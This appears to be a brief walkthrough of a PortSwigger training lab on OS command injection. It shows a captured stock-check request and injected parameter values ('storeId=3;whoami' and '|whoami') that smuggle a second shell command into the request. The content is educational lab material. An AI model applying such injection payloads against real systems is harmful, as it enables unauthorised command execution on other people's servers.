# [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

> command injection in store query

- open burp suite
- open any product page
- check the product stock (stock check button)
- check the request in burp suite history

```
POST /product/stock HTTP/2
Host: xxx.web-security-academy.net
Cookie: session=Es8LmwABXSVrM0xOPZQMjc8dSeUwM9pF
Content-Length: 28
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://xxx.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xxx.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=3
```

- the important part is the `productId=1&storeId=3`

> injecting command in the parameters

```
productId=1&storeId=3;whoami
```

or

```
productId=1&storeId=3|whoami
```

- in the response there will be the user name
